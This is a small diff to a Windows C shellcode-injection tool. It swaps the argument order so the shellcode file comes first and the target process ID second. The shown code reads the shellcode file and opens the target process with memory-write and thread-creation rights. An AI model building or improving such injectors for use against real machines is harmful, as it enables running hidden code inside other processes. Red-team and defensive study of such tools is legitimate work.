@@ -17,7 +17,7 @@ main(int argc, char const *argv[])
 		return 0;
 	}
 
-    FILE * file = fopen(argv[2], "r+");
+    FILE * file = fopen(argv[1], "r+");
     if (file == NULL){
         printf("[-] Can't read shellcode file !\n");
         return 1;
@@ -27,7 +27,7 @@ main(int argc, char const *argv[])
     fclose(file);
     
     // Reading data to array of unsigned chars
-    file = fopen(argv[2], "r+");
+    file = fopen(argv[1], "r+");
     unsigned char * shellcode = (unsigned char *) malloc(size);
     int bytes_read = fread(shellcode, sizeof(unsigned char), size, file);
     fclose(file);
@@ -37,7 +37,7 @@ main(int argc, char const *argv[])
     }
     printf("[*] Shellcode Size: %d bytes\n", size);
 
-    int pid = atoi(argv[1]);
+    int pid = atoi(argv[2]);
     printf("[*] Target PID: %d\n",pid);
     HANDLE ProcessHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,FALSE,DWORD(pid));
     if (ProcessHandle != NULL) {
